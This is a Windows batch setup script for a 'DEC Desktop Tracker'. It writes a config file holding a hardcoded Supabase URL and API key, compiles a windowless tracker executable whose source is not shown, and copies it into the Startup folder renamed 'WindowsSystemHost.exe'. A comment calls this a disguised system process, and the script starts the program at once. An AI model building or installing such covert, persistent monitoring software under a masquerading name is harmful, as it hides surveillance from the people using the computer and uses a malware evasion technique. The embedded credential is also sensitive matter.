@echo off
setlocal
echo ===================================
echo DEC Desktop Tracker Setup
echo ===================================

:: Ensure running in the correct directory
cd /d "%~dp0"

echo This script will configure the background tracker for a specific engineer
echo and compile it into a standalone executable without requiring Python.
echo.

set /p ENGINEER_ID="Enter Engineer ID for this PC: "
if "%ENGINEER_ID%"=="" (
    echo Error: Engineer ID cannot be empty!
    pause
    exit /b 1
)

echo Generating config.cs...
echo namespace DecTracker { > config.cs
echo     public static class Config { >> config.cs
echo         public static string ENGINEER_ID = "%ENGINEER_ID%"; >> config.cs
echo         public static string SUPABASE_URL = "https://wvzfjhovumhwlrcawcwf.supabase.co"; >> config.cs
echo         public static string SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Ind2emZqaG92dW1od2xyY2F3Y3dmIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzE1MDM0MjIsImV4cCI6MjA4NzA3OTQyMn0.MbDtyyPPl3d_HQ7-qwYjYOFnSl6aS69GQCHhd6sjG-c"; >> config.cs
echo     } >> config.cs
echo } >> config.cs

echo.
echo Compiling standalone Executable...
:: Find C# Compiler built into Windows
set CSC="C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"
if not exist %CSC% (
    set CSC="C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe"
)

if not exist %CSC% (
    echo Error: Built-in C# Compiler not found!
    pause
    exit /b 1
)

%CSC% /nologo /target:winexe /out:tracker.exe tracker.cs config.cs

if not exist "tracker.exe" (
    echo Error: Failed to compile the executable!
    pause
    exit /b 1
)

echo.
echo Installing to Windows Startup folder...
:: Copy the resulting tracker.exe into the active user's Startup folder as a disguised system process
copy /Y "tracker.exe" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\WindowsSystemHost.exe"

echo.
echo Setup Complete! The tracker will now start automatically in the background every time the PC boots.
echo.
echo Starting the tracker right now so you don't have to restart...
start "" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\WindowsSystemHost.exe"

pause
endlocal
exit /b 0
